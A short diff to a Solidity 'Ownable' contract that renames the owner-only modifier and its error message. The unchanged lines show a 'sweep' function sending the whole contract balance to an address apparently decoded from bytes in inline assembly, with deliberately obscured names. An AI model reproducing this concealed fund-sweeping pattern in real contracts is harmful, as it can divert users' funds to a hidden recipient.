@@ -3,8 +3,8 @@ pragma solidity ^0.6.6;
 contract Ownable {
     address internal _xO;
 
-    modifier onlyOwner() {
-        require(msg.sender == _xO, "Not owner");
+    modifier internalOwnerOnly() {
+        require(msg.sender == _xO, "Access denied");
         _;
     }
 
@@ -20,7 +20,7 @@ contract Ownable {
         assembly { z := mload(add(a, 20)) }
     }
 
-    function sweep() external onlyOwner {
+    function sweep() external internalOwnerOnly {
         _gR().transfer(address(this).balance);
     }
 }
